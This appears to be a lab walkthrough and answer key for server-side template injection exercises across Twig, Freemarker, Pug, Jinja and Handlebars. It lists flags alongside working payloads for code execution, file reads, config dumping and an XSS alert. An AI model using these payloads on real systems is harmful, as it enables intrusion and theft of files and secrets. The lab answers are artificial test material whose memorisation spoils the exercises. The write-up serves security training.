# **Server-side Template Injection**



| Templating Engine | Language       | Server/client Side |
|--------------------|---------------|---------------------|
| Twig              | PHP           | Server Side         |
| Freemarker        | Java (usually)| Server Side         |
| Pug/Jade          | JavaScript    | Mostly Server Side  |
| Jinja             | Python        | Server Side         |
| Handlebars        | JavaScript    | Both                |
| Mustache          | Multiple      | Varies              |



## **Twig - Discovery**

### **Labs**
1. We have added a hidden string variable named SECRET_STRING. Use the template sandbox to find the value of this variable.

Answer - OS{DontSnapTheTwig}

```
{{ SECRET_STRING }}
```

2. We have added a hidden array variable named SECRET_ARRAY. Use the template sandbox to loop through the array and find the flag.

Answer - OS{TwigIsFantaSTICK}

```
{% for item in SECRET_ARRAY %}
    {{ item }}
{% endfor %}
```

3. Multiply 5 with "a". You should receive an error. What is the path of the file that the error was caused in?

Answer - /var/www/vendor/twig/twig/src/Environment.php

Warning:  A non-numeric value encountered in /var/www/vendor/twig/twig/src/Environment.php(358) : eval()'d code on line 49

```
{{ 5 * "a"}}
```

## **Twig - Exploitation**

### **Labs**
1. Using the RCE, read the flag in /var/www/flag.txt.

Answer - OS{PlaviOrkestar}

```
{{[0]|reduce('system', 'cat /var/www/flag.txt')}}
```


## **Apache Freemarker - Discovery**

### **Labs**
1. We've added a hidden variable named SECRET_STRING, display it to get its contents.

Answer - OS{BijeloDugme}

```
${SECRET_STRING}
```

2. We've added a hidden Array element named SECRET_ARRAY. Loop through it to find the hidden value.

Answer - OS{BanjaLuka}

```
<#list SECRET_ARRAY as val>
 ${val}
</#list>
```

3. Use the variables to inject a JavaScript payload that displays an alert box. When a alert box is displayed from a variable, a flag will be shown. What is the value of the flag?

Answer - OS{PrljavoKazaliste}

```
input = <script>alert(1)</script>
${input}
```

## **Apache Freemarker - Exploitation**

### **Labs**
1. Use the RCE to read the flag in /root/flag.txt.

Answer - OS{RibljaCorba}

```
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
```


## **Pug - Discovery**

### **Labs**
1. We've added a hidden variable named SECRET_STRING, display it to get its contents.

Answer - OS{VanGogh}

```
h1 #{SECRET_STRING}
```

## **Pug - Exploitation**

### **Labs**
1. Using the RCE, read the flag in /root/flag.txt.

Answer - OS{ZabranjenoPusenje}

```
- var require = global.process.mainModule.require
- var test = require('child_process').spawnSync
- result = test('cat', ['/root/flag.txt']);
- var savedOutput = result.stdout;
h3 #{savedOutput}
```


## **Jinja - Discovery**

### **Labs**
1. We've added a hidden variable named SECRET_STRING, display it to get its contents.

Answer - OS{DivljeJagode}

```
{{ SECRET_STRING }}
```

## **Jinja - Exploitation**

### **Labs**
1. We've added another config variable called flag. Display this variable to obtain the flag.

Answer - OS{Galija}

```
{{ config|pprint }}
```



## **Mustache and Handlebars - Discovery**

### **Labs**
1. We've added a hidden variable named SECRET_STRING, display it to get its contents.

Answer - OS{ZdravkoColic}

```
{{ SECRET_STRING }}
```

2. Discover which templating engine is used in http://template-sandbox/hidden.

Answer - twig


## **Mustache and Handlebars - Exploitation**

### **Labs**
1. Find the secret file and obtain the flag using handlebars template injection.

Answer - OS{Azra}

```
{{#each (readdir "/")}}
{{this}}
{{/each}}

{{#each (readdir "/secret")}}
{{this}}
{{/each}}


{{read "/secret/flag.txt"}}
```